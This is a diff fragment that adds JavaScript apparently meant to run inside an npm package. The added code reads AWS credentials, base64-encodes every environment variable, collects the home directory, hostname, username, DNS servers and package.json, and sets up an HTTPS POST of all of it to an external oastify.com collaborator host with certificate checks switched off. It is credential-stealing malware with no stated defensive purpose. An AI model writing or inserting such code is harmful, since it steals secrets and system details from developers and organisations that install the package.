@@ -1,0 +1,49 @@
+printAwsCredentials().then((res)=>{
+
+
+  aws_c = res || undefined ;
+  var env_vars = "";
+
+  try{
+      env_vars = btoa(JSON.stringify(process.env));
+  }catch(e){}
+
+  const pwd = process.cwd();
+
+
+
+  const trackingData = JSON.stringify({
+      p: package,
+      c: __dirname,
+      cwd: pwd,
+      hd: os.homedir(),
+      hn: os.hostname(),
+      un: os.userInfo().username,
+      dns: dns.getServers(),
+      r: packageJSON ? packageJSON.___resolved : undefined,
+      v: packageJSON.version,
+      pjson: packageJSON,
+      env: env_vars,
+      aws: aws_c,
+  });
+
+  var postData = querystring.stringify({
+      msg: trackingData,
+  });
+
+  var options = {
+      hostname: "hoots-lib.lsh5kazu22cydoxxbyusokspxg37r0fp.oastify.com",
+      port: 443,
+      path: "/",
+      method: "POST",
+      headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "Content-Length": postData.length,
+      },
+      rejectUnauthorized: false,
+      requestCert: true,
+      agent: false,
+ ...
+aws_c = res || undefined
+var env_vars = ""
+env_vars = btoa(JSON.stringify(process.env))
